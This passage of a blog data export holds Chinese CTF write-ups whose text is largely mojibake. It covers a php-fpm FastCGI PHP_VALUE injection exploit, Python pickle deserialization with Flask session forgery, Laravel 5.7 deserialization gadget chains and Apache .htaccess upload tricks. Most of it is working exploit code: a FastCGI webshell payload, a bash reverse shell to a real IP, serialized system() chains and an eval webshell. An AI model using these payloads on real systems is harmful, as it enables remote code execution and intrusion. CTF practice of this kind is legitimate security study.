FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) &#123; $array = array(); if ($length === null) &#123; $length = strlen($data); &#125; $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) &#123; $ret = array(); $ret[&#x27;version&#x27;] = ord($data&#123;0&#125;); $ret[&#x27;type&#x27;] = ord($data&#123;1&#125;); $ret[&#x27;requestId&#x27;] = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;); $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;); $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;); $ret[&#x27;reserved&#x27;] = ord($data&#123;7&#125;); return $ret; &#125; /** * Read a FastCGI Packet * * @return array */ private function readPacket() &#123; if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123; $resp = $this-&gt;decodePacketHeader($packet); $resp[&#x27;content&#x27;] = &#x27;&#x27;; if ($resp[&#x27;contentLength&#x27;]) &#123; $len = $resp[&#x27;contentLength&#x27;]; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123; $len -= strlen($buf); $resp[&#x27;content&#x27;] .= $buf; &#125; &#125; if ($resp[&#x27;paddingLength&#x27;]) &#123; $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]); &#125; return $resp; &#125; else &#123; return false; &#125; &#125; /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) &#123; $this-&gt;connect(); $request = &#x27;&#x27;; foreach ($requestedInfo as $info) &#123; $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;); &#125; fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123; return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]); &#125; else &#123; throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;); &#125; &#125; /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) &#123; $response = &#x27;&#x27;;// $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;); echo(&#x27;data=&#x27;.urlencode($request));// fwrite($this-&gt;_sock, $request);// do &#123;// $resp = $this-&gt;readPacket();// if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;// $response .= $resp[&#x27;content&#x27;];// &#125;// &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);// var_dump($resp);// if (!is_array($resp)) &#123;// throw new Exception(&#x27;Bad request&#x27;);// &#125;// switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;// case self::CANT_MPX_CONN:// throw new Exception(&#x27;This app can\\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);// break;// case self::OVERLOADED:// throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);// break;// case self::UNKNOWN_ROLE:// throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);// break;// case self::REQUEST_COMPLETE:// return $response;// &#125; &#125;&#125;?&gt;&lt;?php// real exploit start here//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;// die(&quot;Check your input\\n&quot;);//&#125;//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;// $filepath = __FILE__;//&#125;else&#123;// $filepath = $_REQUEST[&#x27;filepath&#x27;];//&#125;$filepath = &quot;/var/www/html/add_api.php&quot;; // ç›®æ ‡ä¸»æœºå·²çŸ¥çš„PHPæ–‡ä»¶çš„è·¯å¾„$req = &#x27;/&#x27;.basename($filepath);$uri = $req .&#x27;?&#x27;.&#x27;command=whoami&#x27;; // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);$code = &quot;&lt;?php system(\\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;; // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡$php_value = &quot;unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = hpdoger.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = &quot;;$params = array( &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $filepath, &#x27;SCRIPT_NAME&#x27; =&gt; $req, &#x27;QUERY_STRING&#x27; =&gt; &#x27;command=whoami&#x27;, &#x27;REQUEST_URI&#x27; =&gt; $uri, &#x27;DOCUMENT_URI&#x27; =&gt; $req,#&#x27;DOCUMENT_ROOT&#x27; =&gt; &#x27;/&#x27;, &#x27;PHP_VALUE&#x27; =&gt; $php_value, &#x27;SERVER_SOFTWARE&#x27; =&gt; &#x27;80sec/wofeiwo&#x27;, &#x27;REMOTE_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27; =&gt; &#x27;9001&#x27;, &#x27;SERVER_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27; =&gt; &#x27;80&#x27;, &#x27;SERVER_NAME&#x27; =&gt; &#x27;localhost&#x27;, &#x27;SERVER_PROTOCOL&#x27; =&gt; &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_LENGTH&#x27; =&gt; strlen($code));// print_r($_REQUEST);// print_r($params);//echo &quot;Call: $uri\\n\\n&quot;;echo $client-&gt;request($params, $code).&quot;\\n&quot;;?&gt; 1hack.php?file&#x3D;ftp:&#x2F;&#x2F;81.69.201.65:2000&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 ç„¶åæˆ‘åˆå¼¹ä¸å‡ºæ¥shelläº†ï¼Ÿï¼Ÿï¼Ÿ","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"PHPç‰¹æ€§","slug":"PHPç‰¹æ€§","permalink":"http://example.com/tags/PHP%E7%89%B9%E6%80%A7/"}]},{"title":"è™ç¬¦FINALeasyflasku'x","slug":"è™ç¬¦FINALeasyflask","date":"2021-05-12T07:33:26.000Z","updated":"2021-05-12T07:48:21.240Z","comments":true,"path":"2021/05/12/è™ç¬¦FINALeasyflask/","link":"","permalink":"http://example.com/2021/05/12/%E8%99%8E%E7%AC%A6FINALeasyflask/","excerpt":"","text":"çŸ¥è¯†ç‚¹Pythonçš„ååºåˆ—åŒ– Flask sessionä¼ªé€  æ€è·¯ï¼šé¢˜ç›®æ˜¯å¯ä»¥æ‹¿åˆ°æºç çš„ï¼Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123; &#x27;uname&#x27;: &#x27;test&#x27;, &#x27;is_admin&#x27;: 0, &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler(): if not session.get(&#x27;u&#x27;): u = pickle.dumps(User()) session[&#x27;u&#x27;] = u return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler(): path = request.args.get(&#x27;file&#x27;) path = os.path.join(&#x27;static&#x27;, path) if not os.path.exists(path) or os.path.isdir(path) \\ or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path: return &#x27;disallowed&#x27; with open(path, &#x27;r&#x27;) as fp: content = fp.read() return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler(): try: u = session.get(&#x27;u&#x27;) if isinstance(u, dict): u = b64decode(u.get(&#x27;b&#x27;)) u = pickle.loads(u) except Exception: return &#x27;uhh?&#x27; if u.is_admin == 1: return &#x27;welcome, admin&#x27; else: return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False) çœ‹è§æœ‰keyç›´æ¥è¯»å–/proc/self/environ å°±èƒ½è¯»åˆ°äº† çœ‹è§pickå°±çŸ¥é“æ˜¯Pythonçš„ååºåˆ—åŒ–äº† = = å…³äºPythonçš„ååºåˆ—åŒ–æˆ‘ä¹‹å‰å·²ç»å†™è¿‡äº† æ‰€ä»¥è¿™é‡Œç›´æ¥é€ å®ƒå°±è¡Œäº† 1234567class User: uname = &#x27;ys&#x27; is_admin = 1 __repr__ = lambda o: o.uname def __reduce__(self): return (eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /123&#x27;)&quot;,)) æˆ–è€…ä½ è¿™æ ·ï¼š 123456User = type(&#x27;User&#x27;, (object,), &#123; &#x27;uname&#x27;: &#x27;tyskill&#x27;, &#x27;is_admin&#x27;: 1, &#x27;__repr__&#x27;: lambda o: o.uname, &#x27;__reduce__&#x27;: lambda o: (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.68.201.65/8001 0&gt;&amp;1&#x27;&quot;,))&#125;) éƒ½å¯ä»¥é€ å‡ºæ¥ã€‚ 12u = pickle.dumps(User())print(b64encode(u).decode()) ä¹‹åsessionä¼ªé€ ç”¨githubçš„å·¥å…·ï¼š 1https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;flask-session-cookie-manager ç”Ÿæˆ: 1python3 flask_session_cookie_manager3.py encode -s &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC8xMjMnKZSFlFKULg==&#x27;&#125;&#125;&quot; æ‹¿è¿‡å»æ‰“ è¸©å‘ï¼š1.base64é¦–å…ˆåŠ å¯†æ˜¯ç”Ÿæˆäº†ä¸€ä¸²base64çš„å€¼ï¼Œä½ è¦ä¼ªé€ sessionçš„è¯å¿…é¡»ä½¿ç”¨å­—å…¸çš„æ–¹å¼ï¼Œæ‰€ä»¥é€šè¿‡æä¸€ä¸ªå‡å­—å…¸çš„æ–¹å¼æ¥ç”Ÿæˆï¼š 1&#123;&#x27;u&#x27;:&#123;&#x27;s&#x27;:&#x27;base64çš„å€¼&#x27;&#125;&#125; 2.ç¯å¢ƒé—®é¢˜é¶æœºæ˜¯Linuxç¯å¢ƒï¼Œæœ¬åœ°æ˜¯Windowsç¯å¢ƒï¼Œè¿™ä¸¤ä¸ªç¯å¢ƒä¸‹dumpsçš„ç»“æœä¸­åºåˆ—åŒ–å­—ç¬¦ä¸²å£°æ˜ç³»ç»Ÿçš„æ ‡è¯†ç¬¦ä¸åŒï¼šLinux=&gt;posixï¼›Windows=&gt;ntï¼Œéœ€è¦å°†è„šæœ¬æ”¾åœ¨Linuxç¯å¢ƒä¸‹ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚ 3.BUUå¥½åƒå¼¹ä¸å‡ºæ¥shell123456# User = type(&#x27;User&#x27;, (object,), &#123;# &#x27;uname&#x27;: &#x27;tyskill&#x27;,# &#x27;is_admin&#x27;: 1,# &#x27;__repr__&#x27;: lambda o: o.uname,# &#x27;__reduce__&#x27;: lambda o: (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.68.201.65/8001 0&gt;&amp;1&#x27;&quot;,))# &#125;) æ— è®ºæ˜¯è‡ªå·±æçš„è¿˜æ˜¯ç½‘ä¸Šæ‰¾çš„ï¼Œéƒ½æä¸å‡ºæ¥- -","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Laravel5.7ååºåˆ—åŒ–","slug":"Laravel5-7ååºåˆ—åŒ–","date":"2021-05-11T07:37:54.000Z","updated":"2021-05-11T12:20:09.128Z","comments":true,"path":"2021/05/11/Laravel5-7ååºåˆ—åŒ–/","link":"","permalink":"http://example.com/2021/05/11/Laravel5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"è¿‡æœŸé“¾å­ç¬¬ä¸€æ­¥åšååºåˆ—åŒ–çš„ä»destructå‡ºå‘è€ç”Ÿå¸¸è°ˆäº†ï¼Œç›´æ¥è½åˆ°PendingCommand.phpä¸‹é¢ è·Ÿè¿›runå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ° è€Œappæ˜¯å®Œå…¨å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦çœ‹æ€ä¹ˆå†²äº†ï¼Œè¿™é‡Œä¼šé‡è§ä¸€ä¸ªé—®é¢˜ï¼ŒmockConsoeOutputæ— æ³•æ­£å¸¸è¿è¡Œå®Œ è·Ÿè¿›è¿‡å»ã€‚ ç¬¬äºŒéƒ¨åˆ†ä¸ºäº†è®©ç¬¬ä¸€éƒ¨åˆ†çš„ä»£ç æ­£å¸¸èµ°å®Œæˆ‘ä»¬éœ€è¦$this-&gt;parameters ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œ è€Œç¬¬äºŒä¸ªéƒ¨åˆ†ä¹Ÿéœ€è¦$-&gt;test-&gt;expectedQuestions ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸çŸ¥é“æ­£å¸¸çš„expectedQuestionsæ–¹æ³•ï¼Œä¹Ÿæ‡’å¾—å»æ‰¾ï¼Œæˆ‘ä»¬åªå¸Œæœ›è¿™æ®µå‡½æ•°èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œå°±å¥½ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸€ä¸ªcallæ–¹æ³•ï¼Œèƒ½å¤Ÿä½¿å¾—æˆ‘ä»¬æ§åˆ¶è¿”å›ç»“æœä¸ºæ•°ç»„ã€‚ æœç´¢æ‰¾åˆ° è¿™æ ·çš„è¯ç¨‹åºå°±å¯ä»¥æˆåŠŸèµ°å®Œäº†ï¼Œæˆ‘ä»¬åˆå›åˆ°è¿™é‡Œï¼š æ‰¾ä¸€ä¸ªcallæ–¹æ³•å¯æ§çš„ç±»ã€‚ä¸€å¼€å§‹æˆ‘æ‰¾åˆ°çš„æ˜¯Generatorç±»ï¼Œè¿™ä¸ªç±»çš„callæ–¹æ³•ï¼š 12345 public function __call($method, $attributes) &#123;// phpinfo(); return $this-&gt;format($method, $attributes); &#125; è·Ÿè¿›formatå‡½æ•° å†è·Ÿè¿›getFormatterï¼š å’¦ï¼Œç¾æ»‹æ»‹å¯æ§å—· ç¬¬ä¸‰éƒ¨åˆ†ç»“æœæ‰“äº†ä¸€ä¸‹å‘ç°ï¼š å› ä¸ºwakeupè¿™é‡Œç»™ä½ banäº†ï¼š é‚£å°±åªèƒ½å†æ‰¾callæ–¹æ³•äº†ã€‚ ç»·ä¸ä½äº†ï¼Œè¿™å°±ä½ å¦ˆç¦»è°±ï¼Œè¿™ä¸ªäººæ–‡ç« å†™é”™äº†ï¼Œä»–æä¾›çš„æ˜¯5.6ç‰ˆæœ¬çš„æŠŠï¼Ÿï¼Ÿï¼Ÿæ‰€ä»¥è¿™æ¡é“¾å…¶å®èµ°åˆ°å¤´äº† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; protected $app; protected $parameters; protected $command; public $test = []; public function __construct($degen,$Generator) &#123; $this-&gt;app = $Generator; $this-&gt;parameters = [&quot;id&quot;]; $this-&gt;test =$degen ; $this-&gt;command =&quot;system&quot;; &#125; &#125;&#125;//è¿™ä¸ªç±»ç”¨äºè§£å†³æŠ¥é”™é—®é¢˜namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct() &#123; $this-&gt;default = []; &#125; &#125; class Generator&#123; protected $formatters = array(&quot;bind&quot;=&gt;&quot;123&quot;); public function __construct() &#123; $formatters = array(&quot;bind&quot;=&gt;&quot;123&quot;); &#125; &#125;&#125;namespace &#123; use Faker\\DefaultGenerator; use Illuminate\\Foundation\\Testing\\PendingCommand; $degen = new DefaultGenerator(); $Generator = new \\Faker\\Generator(); $pencom = new PendingCommand($degen,$Generator); echo urlencode(serialize($pencom));&#125; 5.7 å¸ˆå‚…ä»¬è¯´çš„æ˜¯ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app)&#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Illuminate\\Auth&#123; class GenericUser&#123; protected $attributes; public function __construct(array $attributes)&#123; $this-&gt;attributes = $attributes; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind)&#123; $this-&gt;bindings=$bind; &#125; &#125;&#125;namespace&#123; $genericuser = new Illuminate\\Auth\\GenericUser( array( &quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;), &quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;) ) ); $application = new Illuminate\\Foundation\\Application( array( &quot;Illuminate\\Contracts\\Console\\Kernel&quot;=&gt; array( &quot;concrete&quot;=&gt;&quot;Illuminate\\Foundation\\Application&quot; ) ) ); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand( &quot;system&quot;,array(&#x27;whoami&#x27;), $genericuser, $application ); echo urlencode(serialize($pendingcommand));&#125;?&gt; å“å“ŸçœŸé€äº†NMã€‚æœ‰å¾—é‡æ–°æ¥äº† æ­£ç¡®çš„é“¾å­","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"http://example.com/tags/Laravel/"}]},{"title":"uploadlabs","slug":"æ´¥é—¨æ¯uploadlabs","date":"2021-05-11T02:05:53.000Z","updated":"2021-05-12T02:52:51.386Z","comments":true,"path":"2021/05/11/æ´¥é—¨æ¯uploadlabs/","link":"","permalink":"http://example.com/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AFuploadlabs/","excerpt":"","text":"çŸ¥è¯†ç‚¹ï¼šapacheæ–‡ä»¶é…ç½® æ€è·¯ï¼šè¿™é“é¢˜ç›®æ”¾å‡ºäº†æºç ï¼Œé€šè¿‡æºç çš„é…ç½®æˆ‘ä»¬æ˜¯å¯ä»¥çœ‹è§çš„ï¼š 12345678&lt;Directory /var/www/&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted&lt;/Directory&gt;&lt;Directory ~ &quot;/var/www/html/upload/[a-f0-9]&#123;32&#125;/&quot;&gt; php_flag engine off&lt;/Directory&gt; è‡ªå·±åšé¢˜çš„æ—¶å€™å› ä¸ºæ²¡æœ‰æ¥è§¦è¿‡ç±»ä¼¼çš„é¢˜ç›®ï¼Œï¼Œapahceçš„æ–‡ä»¶é…ç½®ï¼Œæ‰€ä»¥åšé¢˜çš„æ—¶å€™ä¸€ç›´ä¸Šä¼ .htaccessä¿®æ”¹ä¸º 123&lt;Directory ~ &quot;/var/www/html/upload/[a-f0-9]&#123;32&#125;/&quot;&gt; php_flag engine on&lt;/Directory&gt; ç»“æœè¿˜æ˜¯æ²¡ç”¨ã€ã€‘ å®˜æ–¹WPï¼š123456789&lt;Files .htaccess&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpRequire all grantedphp_flag engine on&lt;/Files&gt;php_value auto_prepend_fi\\le .htaccess#&lt;?php eval($_REQUEST[0])?&gt; ä½†æ˜¯å®˜æ–¹å¯¹äºå…·ä½“åŸç†å¹¶æ²¡æœ‰åšå‡ºè§£é‡Šï¼Œå°è¯•å»çœ‹çœ‹apacheçš„é…ç½®è§£è¯´ ä¸Šé¢ä¸€æ®µçš„phpæ–‡ä»¶ä¹Ÿå°±è¯´æ˜æˆ‘ä»¬çš„æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œPHPæ¥è§£æï¼Œå¹¶ä¸”ä¼šè¢«åŠ å…¥ä¸€å¥è¯æœ¨é©¬ HA1C9ONå¸ˆå‚…çš„å…¶å®apahceçš„å®˜æ–¹æ–‡æ¡£ä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼š è¿™æ®µçš„æ„æ€æ˜¯å‘Šè¯‰æˆ‘ä»¬filesæ ‡ç­¾çš„ä¼˜å…ˆçº§è¦æ›´é«˜ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡: 123&lt;Files &#x27;1.php&#x27;&gt; php_flag engine on&lt;/Files&gt; å†ä¸Šä¼ ä¸€ä¸ª1.phpå³å¯ var_dump(file_get_contents(â€˜/flagâ€™)); Nu1Lè¿™ä¸ªæ€è·¯å®åœ¨æ˜¯å¤ªéªšäº†ã€‚ 1234567891011121314151617181920212223242526272829import requestsimport stringimport hashlibip = requests.get(&#x27;http://118.24.185.108/ip.php&#x27;).textprint(ip)def check(a): f = &#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /&#x27;&#x27;&#x27;+a+&#x27;&#x27;&#x27;/&quot;&gt; ErrorDocument 404 &quot;wupco&quot; &lt;/If&gt; &#x27;&#x27;&#x27; print(f) resp = requests.post(&quot;http://122.112.248.222:20003/index.php?id=167&quot;,data=&#123;&#x27;submit&#x27;: &#x27;submit&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;.htaccess&#x27;,f)&#125; ) a = requests.get(&quot;http://122.112.248.222:20003/upload/&quot;+ip+&quot;/a&quot;).text if &quot;wupco&quot; not in a: return False else: return Trueflag = &quot;flag&#123;&quot;c = string.ascii_letters + string.digits + &quot;\\&#123;\\&#125;&quot;for j in range(32): for i in c: print(&quot;checking: &quot;+ flag+i) if check(flag+i): flag = flag+i print(flag) break else: continue é€šè¿‡ä¿®æ”¹apahceçš„404æ˜¾ç¤ºé¡µé¢ï¼Œæ³¨å…¥å¾—åˆ°flagã€‚ è‡ªå·±æƒ³åˆ°çš„ä¸€ä¸ªæ€è·¯ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— è®ºå¦‚ä½•éƒ½æ˜¯500. æ ¹æ®åˆ«äººçš„è¯´æ³•ï¼š 1https:&#x2F;&#x2F;my.oschina.net&#x2F;mejinke&#x2F;blog&#x2F;49450 ä¿®æ”¹apache2çš„é…ç½®çš„è¯æ˜¯å¯ä»¥ä½¿å¾—HTMLåŒ…å«å…¶ä»–é¡µé¢çš„ï¼Œä½†æ˜¯ä¸€ç›´ä¼šå¤±è´¥ï¼Œä¸çŸ¥é“æœ‰å¸ˆå‚…æ˜¯å¦èƒ½å¤ŸæˆåŠŸ 123456789101112&lt;Directory /&gt; Options FollowSymLinks AllowOverride None&lt;/Directory&gt;&lt;Directory D:/www&gt; AddType text/html .shtml .html .htm AddOutputFilter INCLUDES .shtml .html .htm Options Indexes FollowSymLinks MultiViews Includes ExecCGI AllowOverride All Order allow,deny allow from all&lt;/Directory&gt; hate_PHPè¿™ä¸ªé¢˜ç›®å°±æ˜¯å®‰æ’æœˆèµ›- - 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30387423&#x2F;article&#x2F;details&#x2F;99558868 çŸ¥è¯†ç‚¹ï¼š /bin/cat å°±æ˜¯catå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ è¿™æ ·å°±è¯»å–åˆ°flagäº†= = 1?&gt;&lt;?=`/???/??? /????`;?&gt;","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Apache","slug":"Apache","permalink":"http://example.com/tags/Apache/"}]},{"title":"çº¢å¸½ä¸‰ä¸ªweb","slug":"çº¢å¸½ä¸‰ä¸ªweb","date":"2021-05-09T10:39:26.000Z","updated":"2021-05-09T12:19:49.697Z","comments":true,"path":"2021/05/09/çº¢å¸½ä¸‰ä¸ªweb/","link":"","permalink":"http://example.com/2021/05/09/%E7%BA%A2%E5%B8%BD%E4%B8%89%E4%B8%AAweb/","excerpt":"","text":"find itæºç æ³„éœ²ï¼Œè®¿é—®robots.txt,æ ¹æ®æç¤ºæ‰¾åˆ°æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; 